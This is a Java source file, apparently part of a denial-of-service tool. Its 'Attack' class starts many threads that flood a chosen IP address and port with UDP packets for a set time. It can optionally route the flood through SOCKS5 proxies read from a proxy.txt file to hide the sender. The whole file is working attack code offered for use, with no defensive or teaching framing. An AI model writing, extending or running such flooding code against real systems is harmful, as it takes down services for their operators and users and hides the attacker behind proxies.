package org.example;

import fucksocks.client.Socks5;
import fucksocks.client.Socks5DatagramSocket;
import fucksocks.client.SocksProxy;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.net.*;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;
import java.util.Scanner;

public class Attack {
    static Random rnd = new Random();
    public static void startAttack(boolean PROXY, String IP, int PORT, int TIME, Method METHOD, int THREADS) {

        for (int i = 0; i < THREADS; i++) {
            int finalI = i;
            Thread thread = new Thread(() -> {
                long start = System.currentTimeMillis();
                long end = start + TIME * 1000L;
                byte[] payload;

                if (PROXY) {
                    List<String> proxyLines = new ArrayList<>();
                    try {
                        File proxyFile = new File("proxy.txt");
                        Scanner fileReader = new Scanner(proxyFile);
                        while (fileReader.hasNextLine()) {
                            proxyLines.add(fileReader.nextLine());
                        }
                        fileReader.close();
                    } catch (FileNotFoundException e) {
                        System.out.println("File \"proxy.txt\" is not found!");
                        System.exit(0);
                    }

                    try {
                        String[] proxyLine = proxyLines.get(finalI).split(":");
                        SocksProxy proxy;
                        if (proxyLine.length == 2) {
                            proxy = new Socks5(new InetSocketAddress(proxyLine[0], Integer.parseInt(proxyLine[1])));
                        } else {
                            proxy = new Socks5(new InetSocketAddress(proxyLine[0], Integer.parseInt(proxyLine[1])), proxyLine[2], proxyLine[3]);
                        }
                        DatagramSocket socket = new Socks5DatagramSocket(proxy);
                        while (System.currentTimeMillis() < end) {
                            try {
                                payload = (byte[]) METHOD.invoke(METHOD.getName());
                            } catch (IllegalAccessException | InvocationTargetException e) {
                                throw new RuntimeException(e);
                            }
                            DatagramPacket packet = new DatagramPacket(payload, payload.length, InetAddress.getByName(IP), PORT);
                            socket.send(packet);
                        }
                        socket.close();

                    } catch (IOException  e) {
                        System.err.println(e);
                    }
                } else {
                    try {
                        DatagramSocket socket = new DatagramSocket();
                        while (System.currentTimeMillis() < end) {
                            try {
                                payload = (byte[]) METHOD.invoke(METHOD.getName());
                            } catch (IllegalAccessException | InvocationTargetException e) {
                                throw new RuntimeException(e);
                            }
                            DatagramPacket packet = new DatagramPacket(payload, payload.length, InetAddress.getByName(IP), PORT);
                            socket.send(packet);
                        }
                        socket.close();

                    } catch (IOException e) {
                        System.err.println(e);
                    }
                }
            });
            thread.start();
        }
   }
}
